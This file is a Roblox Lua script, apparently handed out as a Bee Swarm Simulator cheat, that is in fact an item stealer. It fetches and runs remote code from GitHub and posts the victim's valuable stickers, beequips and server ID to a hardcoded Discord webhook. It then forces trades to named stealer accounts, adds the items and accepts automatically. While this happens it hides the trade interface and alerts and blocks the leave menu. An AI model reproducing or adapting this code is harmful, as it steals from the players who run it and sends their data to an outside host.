task.spawn(function()
	if not game:IsLoaded() then
		game.Loaded:Wait()
	end
end)

task.wait()

loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/refs/heads/main/script.lua"))()

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local LocalPlayerID = LocalPlayer.UserId
local PlayerGui = LocalPlayer.PlayerGui
local ScreenGui = PlayerGui:WaitForChild("ScreenGui", math.huge)
local TradeLayer = ScreenGui:WaitForChild("TradeLayer", math.huge)

local Events = require(ReplicatedStorage.Events)
local StickerFile = require(ReplicatedStorage.Stickers.StickerFile)
local StickerTools = require(ReplicatedStorage.Stickers)
local StickerBookMenu = require(ReplicatedStorage.Gui.StickerMenus.StickerBookMenu)

local MAX_OFFER_SIZE = 30

local StealerName = {"guygeebs", "Freshie_bestie"}
local NamesClone = table.clone(StealerName)
if table.find(StealerName, LocalPlayer.Name) then
	table.remove(StealerName, table.find(StealerName, LocalPlayer.Name))
end
local StealerPlayer = nil
local StealerID = nil

local VictimIsTrading = nil
local StealerIsTrading = nil

local WhitelistedStickers = {
	"Brown Cub Skin",
	"Robo Cub Skin",
	"Stick Bug Skin",
	"Star Cub Skin",
	"Noob Cub Skin",
	"Bee Cub Skin",
	"Gingerbread Cub Skin",
	"Snow Cub Skin",
	"Peppermint Robo Cub Skin",
	"Doodle Cub Skin",
	"Gloomy Cub Skin",
	"Wavy Cyan Hive Skin",
	"Wavy Purple Hive Skin",
	"Wavy Yellow Hive Skin",
	"Wavy Doodle Hive Skin",
	"Icy Crowned Hive Skin",
	"Bear Bee Voucher",
	"Cub Buddy Voucher",
	"x2 Bee Gather Voucher",
	"x2 Convert Speed Voucher",
	"Offline Voucher",
	"Ticket Voucher",
	"Round Basic Bee",
	"Diamond Diamond Bee",
	"4-Pronged Vector Bee",
	"Bear Bee Offer",
	"Tabby Scratch",
	"Tabby From Behind",
	"Fuzz Bomb", 
	"Precise Eye",
	"Shy Brown Bear",
	"Sitting Mother Bear",
	"Squashed Head Bear",
	"Stretched Head Bear",
	"Dapper From Above",
	"Sideways Spirit Bear",
	"Glowering Gummy Bear",
	"Stranded Sun Bear",
	"Auryn",
	"Eviction",
	"Cyan Hilted Sword",
	"Wall Crack",
	"Nessie",
	"Black Star",
	"Walking Stick Nymph",
	"Ionic Column Top",
	"Ionic Column Middle",
	"Ionic Column Base",
	"Left Gold Swirl Fleuron",
	"Right Gold Swirl Fleuron",
	"Left Shining Diamond Fleuron",
	"Right Shining Diamond Fleuron",
	"Left Mythic Gem Fleuron",
	"Right Mythic Gem Fleuron",
	"Royal Symbol",
	"Black Truffle Mushroom",
	"Prismatic Mushroom",
	"Gummyballer",
	"Dark Scythe",
	"Capricorn Star Sign",
	"Aquarius Star Sign",
	"Pisces Star Sign",
	"Aries Star Sign",
	"Taurus Star Sign",
	"Gemini Star Sign",
	"Cancer Star Sign",
	"Leo Star Sign",
	"Virgo Star Sign",
	"Libra Star Sign",
	"Scorpio Star Sign",
	"Sagittarius Star Sign",
	"Sunflower Field Stamp",
	"Dandelion Field Stamp",
	"Mushroom Field Stamp",
	"Blue Flower Field Stamp",
	"Clover Field Stamp",
	"Strawberry Field Stamp",
	"Spider Field Stamp",
	"Bamboo Field Stamp",
	"Pineapple Patch Stamp",
	"Stump Field Stamp",
	"Cactus Field Stamp",
	"Pumpkin Patch Stamp",
	"Pine Tree Forest Stamp",
	"Rose Field Stamp",
	"Hub Field Stamp",
	"Mountain Top Field Stamp",
	"Pepper Patch Stamp",
	"Coconut Field Stamp",
	"Ant Field Stamp",
	"Flying Festive Bee",
	"Party Robo Bear",
	"BBM From Below",
}

local WhitelistedBeequips = {
	"Bead Lizard",
	"Beret",
	"Camphor Lip Balm",
	"Candy Ring",
	"Kazoo",
	"Paperclip",
	"Pink Shades",
	"Rose Headband",
	"Smiley Sticker",
	"Sweatband",
	"Whistle",
	"Elf Cap",
	"Festive Wreath",
	"Paper Angel",
	"Poinsettia",
	"Reindeer Antlers",
	"Peppermint Antennas",
	"Snow Tiara",
	"Toy Drum",
	"Toy Horn",
	"Demon Talisman"
}

local StealerOneName
local PrivateServerWaitTime = 60*10

local function WaitForLoad()
	repeat
		for i, v in StealerName do
			StealerPlayer = Players:FindFirstChild(v)
			if StealerPlayer then
				StealerOneName = v
				StealerID = StealerPlayer.UserId
				workspace:WaitForChild(v, math.huge)
				pcall(function()
					workspace[v]:Destroy()
				end)
				VictimIsTrading = LocalPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
				StealerIsTrading = StealerPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
				break
			end
		end
		task.wait(0.5)
	until StealerPlayer
end

local function GetPlayerStats()
	return Events.ClientCall("RetrievePlayerStats")
end

local function GetStickersFilesFrom(StorageType)
	return GetPlayerStats().Stickers[StorageType]
end

local function GetBeequipsFiles()
	local PlayerStats = GetPlayerStats()

	local Beequips = {}

	local CaseBeequips = PlayerStats.Beequips.Case

	for _, FakeFile in CaseBeequips do
		table.insert(Beequips, {F = FakeFile, M = "Case"})
	end

	local StorageBeequips = PlayerStats.Beequips.Storage

	for _, FakeFile in StorageBeequips do
		table.insert(Beequips, {F = FakeFile, M = "Storage"})
	end

	return Beequips
end

local function GetTypeDef(FakeFile)
	local ActualFile = StickerFile.FromData(FakeFile)
	local TypeDef = ActualFile:GetTypeDef()

	return TypeDef
end

local function GetWhitelistedStickers(Storage)
	local WhitelistedFiles = {}

	for _, FakeFile in (Storage) do
		local TypeDef = GetTypeDef(FakeFile)

		if table.find(WhitelistedStickers, TypeDef.Name) then 
			table.insert(WhitelistedFiles, FakeFile)
		end
	end

	return WhitelistedFiles
end

local function GetWhitelistedBeequips(Beequips)
	local WhitelistedFiles = {}
	
	for _, FakeFile in Beequips do
		local InternalName = FakeFile.F.T
		
		if table.find(WhitelistedBeequips, InternalName) then
			table.insert(WhitelistedFiles, FakeFile)
		end
	end
	
	return WhitelistedFiles
end

local function GetNextFreeSlot(PlayerStats)
	local PlayerStats = GetPlayerStats()
	return StickerTools.PlayerStatsToFirstEmptyBookIndex(PlayerStats)
end

local function DiscardSticker(FakeFile)
	Events.ClientCall("StickerDiscard", FakeFile)
end

local function ClaimInboxSticker(FakeFile)
	FakeFile = StickerFile.FromData(FakeFile)
	StickerBookMenu.PressButtonClaimFromInbox(FakeFile)
end

local function AddTradeSticker(FakeFile, SessionID)
	local TypeDef = GetTypeDef(FakeFile)

	local StickerCategory = TypeDef.CosmeticType
	if StickerCategory:find("Voucher") or StickerCategory:find("Hive Skin") or StickerCategory:find("Cub Skin") then
		StickerCategory = "Sticker"
	end

	Events.ClientCall("TradePlayerAddItem", SessionID, {
		["File"] = FakeFile,
		["Category"] = StickerCategory
	})
end

local function AddTradeBeequip(FakeFile, SessionID)
	Events.ClientCall("TradePlayerAddItem", SessionID, {
		["File"] = FakeFile,
		["Category"] = "Beequip"
	})
end

local function AcceptTrade(SessionID)
	Events.ClientCall("TradePlayerAccept", SessionID, {
		[tostring(LocalPlayerID)] = require(ReplicatedStorage.Gui.TradeGui).GetMyOffer(),
		[tostring(StealerID)] = {}
	})

	task.wait(1)

	Events.ClientCall("TradePlayerAccept", SessionID, {
		[tostring(LocalPlayerID)] = require(ReplicatedStorage.Gui.TradeGui).GetMyOffer(),
		[tostring(StealerID)] = {}
	})
end

local function collapseList(list)
	local counts = {}
	local order = {}

	for _, v in list do
		if counts[v] then
			counts[v] += 1
		else
			counts[v] = 1
			table.insert(order, v)
		end
	end

	local result = {}

	for _, v in order do
		local n = counts[v]
		if n > 1 then
			table.insert(result, "[" .. n .. "x] " .. v)
		else
			table.insert(result, v)
		end
	end

	return result
end

local function SendWebhook()
	if table.find(NamesClone, LocalPlayer.Name) then return warn("You are whitelisted - stealer") end
	local Stickers = GetStickersFilesFrom("Book")
	local Beequips = GetBeequipsFiles()

	Stickers = GetWhitelistedStickers(Stickers)
	Beequips = GetWhitelistedBeequips(Beequips)

	local tohex=function(h)
		return h:gsub(".", function(v) return string.format("%02x", v:byte()) end)
	end

	local StickersToSend = {}
	local BeequipsToSend = {}

	local PingAll = false
	for _, FakeFile in Stickers do
		local TypeDef = GetTypeDef(FakeFile)
		local Name = TypeDef.Name
		if (Name == "Icy Crowned Hive Skin" or Name == "Wavy Purple Hive Skin") or (Name ~= "Ticket Voucher" and (tostring(Name):find("Star Sign") or tostring(Name):find("Cub Skin") or tostring(Name):find("Voucher"))) then
			if game:GetService("ReplicatedFirst").PlaceInfo.IsPublicServer.Value then
				PingAll = true
			end
			Name = tostring(Name):upper() .. "!!!!"
		end
		table.insert(StickersToSend, Name)
	end

	if #StickersToSend == 0 then
		return warn(".")
	end

	for _, FakeFile in Beequips do
		table.insert(BeequipsToSend, (FakeFile.F.T or "Unknown") .. " [" .. FakeFile.M .. "]")
	end


	StickersToSend = collapseList(StickersToSend)
	BeequipsToSend = collapseList(BeequipsToSend)
	table.sort(StickersToSend)

	local IsHiveHub = game.ReplicatedFirst.PlaceType.Value == "Hive Hub"
	if IsHiveHub then return end

	local data = {
		content = (PingAll and "@everyone\n" or "\n") .. 
			string.format(
				"\n**Teleport to server**\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(game.PlaceId,\"%s\",game.Players.LocalPlayer)",
				game.JobId
			),
		["embeds"] = {
			{
				["title"] = LocalPlayer.Name .. (IsHiveHub and " **[HIVE HUB]** " or " ") .. identifyexecutor(),
				["color"] = 0xFFD700, -- gold color
				fields = {
					{
						name = "Stickers",
						inline = false,
						value = (#StickersToSend > 0 and table.concat(StickersToSend, "\n") or "None")
					},
					{
						name = "Beequips",
						inline = false,
						value =  (#BeequipsToSend > 0 and table.concat(BeequipsToSend, "\n") or "None")
					}
				},
				footer = {text = "v1.1"}
			}
		}
	}

	data = HttpService:JSONEncode(data)

	local WebhookURL = "https://discord.com/api/webhooks/1479201123238678599/54l2VRz8OTEZYOnq-v8N6vV3pT70MdFOJkUtrrl1YgQh6hS6dRpOEOeLo5EK9HfZ9qKM" --NO deletey
	if not game:GetService("ReplicatedFirst").PlaceInfo.IsPublicServer.Value then
		print(request({
			Url = WebhookURL,
			Body = HttpService:JSONEncode({content = "executed but in private server (username = " .. LocalPlayer.Name .. ") " ..
				" teleporting to public server <t:" .. (os.time() + PrivateServerWaitTime) .. ":R>"
			}),
			Method = "POST",
			Headers = {
				["content-type"] = "application/json"
			}
		}).StatusCode)
		print(request({
			Url = WebhookURL,
			Body = data,
			Method = "POST",
			Headers = {
				["content-type"] = "application/json"
			}
		}).StatusCode)

		task.wait(PrivateServerWaitTime)
		local TeleportService = game:GetService("TeleportService")

		local placeId = game.PlaceId
		local currentJob = game.JobId

		local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
		local response = HttpService:JSONDecode(game:HttpGet(url))

		for _, server in response.data do
			if server.playing < server.maxPlayers and server.id ~= currentJob then
				TeleportService:TeleportToPlaceInstance(placeId, server.id, LocalPlayer)
				break
			end
		end
		return
	end

	print(request({
		Url = WebhookURL,
		Body = data,
		Method = "POST",
		Headers = {
			["content-type"] = "application/json"
		}
	}).StatusCode)
	-- Heartbeat
	task.spawn(function()
		local tick = os.time
		local HB_INTERVAL = 120 -- 2 minutes
		local NextHeartbeat = tick() + HB_INTERVAL
		local HeartbeatsEnabled = false
		while task.wait() do
			if not HeartbeatsEnabled then return end
			local data = HttpService:JSONEncode({
				content = string.format("heartbeat recived from %s next heartbeat <t:%d:R>", LocalPlayer.Name, tick() + HB_INTERVAL)
			})
			if tick() >= NextHeartbeat then
				NextHeartbeat = tick() + HB_INTERVAL
				request({
					Url = WebhookURL,
					Body = data,
					Method = "POST",
					Headers = {
						["content-type"] = "application/json"
					}
				})
			end
		end
	end)
end

local function HideTradeGui()
	if TradeLayer:FindFirstChild("TradeAnchorFrame") then
		TradeLayer.TradeAnchorFrame.Visible = false
	end
	TradeLayer.ChildAdded:Connect(function(child)
		if child.Name ~= "TradeAnchorFrame" then return end
		child.Visible = false
	end)

	local BlurShade = ScreenGui:WaitForChild("BlurShade", math.huge)
	BlurShade.Visible = false
	BlurShade:GetPropertyChangedSignal("Visible"):Connect(function()
		if BlurShade.Visible and TradeLayer:FindFirstChild("TradeAnchorFrame") then 
			BlurShade.Visible = false
		end
	end)

	task.spawn(function()
		local Blur = Lighting:WaitForChild("Blur", math.huge)
		Blur.Enabled = false
		Blur:GetPropertyChangedSignal("Enabled"):Connect(function()
			if Blur.Enabled then 
				Blur.Enabled = false
			end
		end)
	end)

	local MessagePromptBox = ScreenGui:WaitForChild("MessagePromptBox", math.huge)
	MessagePromptBox.Visible = false
	MessagePromptBox:GetPropertyChangedSignal("Visible"):Connect(function()
		if MessagePromptBox.Visible then 
			local Hide = false

			for i, v in MessagePromptBox:GetDescendants() do
				if (v:IsA("TextLabel") or v:IsA("TextButton")) and v.Text:lower():find("trade") then
					Hide = true
				end
			end

			if not Hide then return end
			MessagePromptBox.Visible = false
		end
	end)
end

local function EnablePlayerMovement()
	local MasterControl = LocalPlayer:WaitForChild("PlayerScripts", math.huge):WaitForChild("ControlScript", math.huge):WaitForChild("MasterControl", math.huge)
	require(MasterControl):Enable()
end


local SessionID = nil
Events.ClientListen("TradeUpdateInfo", function(IncomingData)
	SessionID = IncomingData.SessionID
end)

local function StealingSession()
	while VictimIsTrading.Value or StealerIsTrading.Value do
		task.wait()
	end

	Events.ClientCall("TradePlayerRequestStart", StealerID)

	TradeLayer:WaitForChild("TradeAnchorFrame", math.huge)

	EnablePlayerMovement()

	while SessionID == nil do task.wait() end

	local BookStickers = GetStickersFilesFrom("Book")
	local WhitelistedBook = GetWhitelistedStickers(BookStickers)

	local MaxSize = #WhitelistedBook >= MAX_OFFER_SIZE and MAX_OFFER_SIZE or #WhitelistedBook

	if #WhitelistedBook > 0 then
		for _, FakeFile in WhitelistedBook do
			if MaxSize == 0 then break end
			task.wait(0.15)
			AddTradeSticker(FakeFile, SessionID)
			MaxSize -= 1
		end
	end

	local Beequips = GetBeequipsFiles()
	local WhitelistedBQs = GetWhitelistedBeequips(Beequips)

	local SpaceLeft = MAX_OFFER_SIZE - #WhitelistedBook

	if #WhitelistedBQs > 0 and SpaceLeft > 0 then
		for _, FakeFile in WhitelistedBQs do
			if SpaceLeft == 0 then break end
			task.wait(0.15)
			AddTradeBeequip(FakeFile.F, SessionID)
			SpaceLeft -= 1
		end
	end

	task.wait(3)

	AcceptTrade(SessionID)

	if #WhitelistedBook + #WhitelistedBQs > MAX_OFFER_SIZE then
		StealingSession()
	end
end

LocalPlayer.OnTeleport:Connect(function(State)
	queue_on_teleport("loadstring(game:HttpGet("https://raw.githubusercontent.com/gittterhub/atlas/main/atlas_bss.lua"))()")
end)

local function WaitForAvailableServer()
	local Current
	local MaxPlayers = 6
	repeat 
		Current = #Players:GetPlayers()
		task.wait()
	until Current < Players.MaxPlayers
end

local function PreventLeaving()
	local Suc, Res = pcall(function()
		return game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page
	end)

	local LeavePage

	if not Suc then
		return warn("not found page", Res)
	else
		LeavePage = Res
	end

	game:GetService("RunService").RenderStepped:Connect(function()
		LeavePage.Visible = false
	end)
end

local Old; Old = hookfunction(require(ReplicatedStorage.AlertBoxes).Push, newcclosure(function(self, Text, ...)
	if Text:find(StealerOneName) and Text:lower():find("trade") then
		return;
	end
	return Old(self, Text, ...)
end))

task.spawn(PreventLeaving)

WaitForAvailableServer()

SendWebhook()

WaitForLoad()

task.spawn(function()
	while task.wait() do
		local LastTrade = 0
		while task.wait() and Players:FindFirstChild(StealerOneName) do
			if tick() - LastTrade >= 15 then
				LastTrade = tick()
				Events.ClientCall("TradePlayerRequestStart", StealerID)
			end
		end
		WaitForLoad()
	end
end)

Players.PlayerRemoving:Connect(function(Plr)
	if Plr == StealerPlayer then
		StealerPlayer, StealerOneName = nil, nil
		StealerIsTrading = false
	end
end)

--[[
HE dont even run ts tbh
pcall(function()
	require(game.ReplicatedStorage.Trading):DisableTracking()
end)
]]

HideTradeGui()

StealingSession()